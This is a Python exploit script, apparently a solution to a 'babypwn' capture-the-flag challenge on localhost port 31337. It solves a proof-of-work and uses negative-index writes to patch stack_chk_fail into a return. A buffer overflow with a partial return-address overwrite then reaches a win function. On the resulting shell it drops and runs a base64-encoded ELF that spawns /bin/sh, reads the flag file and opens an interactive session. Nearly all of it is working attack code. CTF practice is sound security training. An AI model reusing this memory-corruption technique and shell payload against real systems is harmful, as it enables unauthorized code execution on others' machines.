#!/usr/bin/env python3
import sys, socket, time, re, subprocess, struct, telnetlib
import hashlib

def pow_hash(challenge, solution):
    return hashlib.sha256(challenge.encode('ascii') + struct.pack('<Q', solution)).hexdigest()

def check_pow(challenge, n, solution):
    h = pow_hash(challenge, solution)
    return (int(h, 16) % (2**n)) == 0

def solve_pow(challenge, n):
    candidate = 0
    while True:
        if check_pow(challenge, n, candidate):
            return candidate
        candidate += 1

def reconnect():
    sock = socket.socket()
    sock.connect(('localhost', 31337))
    time.sleep(1)
    s = sock.recv(0x100).decode()
    chall = re.search('Challenge: (.{10})', s).groups()[0]
    n = int(re.search('n: ([0-9]+)', s).groups()[0])
    resp = solve_pow(chall, n)
    sock.send('{}\n'.format(resp).encode())
    s = sock.recv(0x100)
    if s != b'Go\n':
        print(s)
        exit(1)
    return sock

wait = lambda: (sys.stdout.flush(), time.sleep(.3))

for i in range(0x100):

    sock = reconnect()

    sock.send(struct.pack('<q', -0x38))
    print('.', end = ''); wait()

    sock.send(b'\x60')  # read -> write
    print('.', end = ''); wait()

    print('?', end = ' '); wait()

    s = sock.recv(0x1000)
    print(s)
    if b'\xc8\xff\xff\xff' not in s:
        continue

    for j in range(199):

        print('{:5d}'.format(j), end = ' ')

        sock.sendall(struct.pack('<q', -0x48))
        print('.', end = ''); wait()

        sock.sendall(b'\x96') # stack_chk_fail -> ret
        print('.', end = ''); wait()

        sock.sendall(
                b'X' * 8            # index
              + b'C' * 8            # cookie
              + b'\0' * 8           # saved rbp
              + b'\x1d\x78\x78'     # partial overwrite -> win
            )
        print('!', end = ''); wait()

        sock.sendall(b'echo ')
        print('.', end = ''); wait()
        sock.sendall(b'pwnd\n')
        print('?', end = ' '); wait()

        s = sock.recv(0x1000)
        print(s)
        if b'pwnd' in s:
            sock.send(b'export LD_PRELOAD=\n')
            sock.send(b'id; echo\n')
            sock.send(b'pwd; echo\n')
            sock.send(b'env; echo\n')
#            sock.send(b'find / | LD_PRELOAD= grep -i flag; echo\n')
            sock.send(b'echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAANAAAAAAAAAAAAAAAEAAOAABAEAAAwACAAEAAAAFAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAuQAAAAAAAAC5AAAAAAAAAAAAIAAAAAAAMf+4JQAAAA8FSI08JaEAQABIjTQlqQBAAEiNFCWxAEAAuDsAAAAPBcwvYmluL3NoAKEAQAAAAAAAAAAAAAAAAAAALnNoc3RydGFiAC50ZXh0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALAAAAAQAAAAYAAAAAAAAAeABAAAAAAAB4AAAAAAAAAEEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAuQAAAAAAAAARAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAA== | base64 -d > /tmp/pU0Kp9cuUDMuK1yRn4QC6gUO5KbK1vns\n')
            sock.send(b'chmod +x /tmp/pU0Kp9cuUDMuK1yRn4QC6gUO5KbK1vns\n')
            sock.send(b'echo payload?\n')
            sock.send(b'exec /tmp/pU0Kp9cuUDMuK1yRn4QC6gUO5KbK1vns\n')
            wait()
            sock.send(b'echo still there.\n')
            sock.send(b'rm /tmp/pU0Kp9cuUDMuK1yRn4QC6gUO5KbK1vns\n')
            sock.send(b'echo shell!\n')
            sock.send(b'cat /opt/ctf/babypwn/home/flag\n') # added after I found it

            print('\n$$$$$$$$$$$$$$$$\n')

            tel = telnetlib.Telnet()
            tel.sock = sock
            tel.interact()

            exit()
